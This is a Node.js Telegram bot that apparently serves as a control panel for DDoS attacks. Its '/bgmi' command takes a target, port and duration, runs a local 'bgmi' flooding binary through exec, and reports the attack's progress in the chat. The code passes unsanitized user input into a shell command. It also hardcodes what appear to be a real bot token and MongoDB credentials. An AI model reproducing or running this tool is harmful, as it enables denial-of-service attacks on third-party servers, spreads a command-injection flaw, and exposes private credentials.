const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const os = require('os');
const { createCanvas } = require('canvas');
const mongoose = require('mongoose');

// Insert your Telegram bot token here
const bot = new TelegramBot('7243507478:AAGbl43hj5HOtRzbyIMdU1KU0XYclyQcksI', { polling: true });

mongoose.connect('mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv')
    .then(() => console.log("✅ Connected to MongoDB"))
    .catch(err => console.error("❌ MongoDB Connection Error:", err));


// Define User Schema
const userSchema = new mongoose.Schema({
    userId: String
});
const User = mongoose.model('User', userSchema);

// Admin user IDs
const adminIds = ["6107545405", "6107545405", "1600832237", "1600832237"];

// ✅ Function to Generate CPU Usage Image
async function generateCPUImage() {
    const canvas = createCanvas(400, 200);
    const ctx = canvas.getContext('2d');

    const cpuUsage = os.loadavg()[0] * 10; // Get CPU load (scaled)
    const totalMem = os.totalmem() / (1024 * 1024 * 1024); // Convert to GB
    const freeMem = os.freemem() / (1024 * 1024 * 1024); // Convert to GB
    const usedMem = totalMem - freeMem;

    ctx.fillStyle = '#000';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.fillStyle = '#fff';
    ctx.font = '20px Arial';
    ctx.fillText(`CPU Usage: ${cpuUsage.toFixed(2)}%`, 50, 50);
    ctx.fillText(`Total RAM: ${totalMem.toFixed(2)} GB`, 50, 100);
    ctx.fillText(`Used RAM: ${usedMem.toFixed(2)} GB`, 50, 150);

    const buffer = canvas.toBuffer('image/png');
    fs.writeFileSync('cpu_usage.png', buffer);
}

// ✅ Function to Send Dynamic Countdown
async function sendCountdownMessage(chatId, duration, target, port) {
    let remainingTime = duration;
    let messageText = `🔥 **Attack Started!** 🔥\n🎯 Target: ${target}\n🔢 Port: ${port}\n⏳ Time Left: ${remainingTime}s`;
    
    let sentMessage = await bot.sendMessage(chatId, messageText, { parse_mode: 'Markdown' });

    const interval = setInterval(async () => {
        remainingTime -= 5; // Update every 5 seconds
        if (remainingTime <= 0) {
            clearInterval(interval);
            await bot.editMessageText(`✅ **Attack Completed!** ✅\n🎯 Target: ${target}\n🔢 Port: ${port}`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: 'Markdown'
            });
            return;
        }
        
        await bot.editMessageText(`🔥 **Attack In Progress!** 🔥\n🎯 Target: ${target}\n🔢 Port: ${port}\n⏳ Time Left: ${remainingTime}s`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: 'Markdown'
        });
    }, 5000);
}

// ✅ `/bgmi` Command (Now Includes CPU Image & Countdown)
bot.onText(/\/bgmi (\S+) (\d+) (\d+)/, async (msg, match) => {
    const userId = msg.chat.id.toString();
    const user = await User.findOne({ userId });

    if (!user) {
        bot.sendMessage(userId, "🚫 Unauthorized Access! Contact an admin.");
        return;
    }

    const target = match[1];
    const port = parseInt(match[2]);
    const time = parseInt(match[3]);

    if (time > 300) {
        bot.sendMessage(userId, "❌ Error: Time must be less than 300 seconds.");
        return;
    }

    await generateCPUImage();
    await bot.sendPhoto(userId, 'cpu_usage.png', { caption: "📊 **Server CPU Usage Before Attack**" });

    sendCountdownMessage(userId, time, target, port);

    const command = `./bgmi ${target} ${port} ${time}`;
    exec(command, (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(userId, `❌ Error executing attack: ${error.message}`);
            return;
        }
    });
});

// ✅ `/start` Command
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "👋 Welcome! Use /help for commands.");
});
// ✅ `/add` Command (To Add a User)
bot.onText(/\/add (\S+)/, async (msg, match) => {
    const userId = msg.chat.id.toString();

    // Check if the user is an admin
    if (!adminIds.includes(userId)) {
        bot.sendMessage(userId, "🚫 Unauthorized Access! You need admin privileges to add a user.");
        return;
    }

    const newUserId = match[1];
    
    // Check if the user already exists
    const existingUser = await User.findOne({ userId: newUserId });
    if (existingUser) {
        bot.sendMessage(userId, "❌ This user is already authorized.");
        return;
    }

    // Add the new user to the database
    const newUser = new User({ userId: newUserId });
    await newUser.save();

    bot.sendMessage(userId, `✅ User with ID ${newUserId} has been successfully added.`);
});

// ✅ `/help` Command
bot.onText(/\/help/, (msg) => {
    const helpText = `
📜 **Available Commands:**
- /bgmi <target> <port> <time> : Start an attack.
- /add <userId> : Add a user.
- /remove <userId> : Remove a user.
- /allusers : Show authorized users.
- /start : Start the bot.
- /help : Show available commands.
    `;
    bot.sendMessage(msg.chat.id, helpText, { parse_mode: "Markdown" });
});

// Start polling
console.log("Bot is running...");
